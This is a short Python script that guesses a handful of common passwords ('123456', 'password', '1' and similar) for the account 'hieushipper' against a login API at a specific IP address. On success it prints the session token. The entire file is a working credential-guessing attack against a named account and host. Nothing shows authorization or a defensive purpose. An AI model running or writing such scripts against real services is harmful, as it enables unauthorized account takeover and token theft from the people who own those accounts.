import requests, sys

user = 'hieushipper'
passwords = ['123456', '123123', 'password', '1', '123']

for p in passwords:
    r = requests.post('http://207.180.233.84:8000/api/auth/login', json={'ten_dang_nhap': user, 'mat_khau': p})
    if r.status_code == 200:
        print('SUCCESS:', p)
        print('Token:', r.json().get('token'))
        sys.exit(0)

print('Failed to login.')
sys.exit(1)
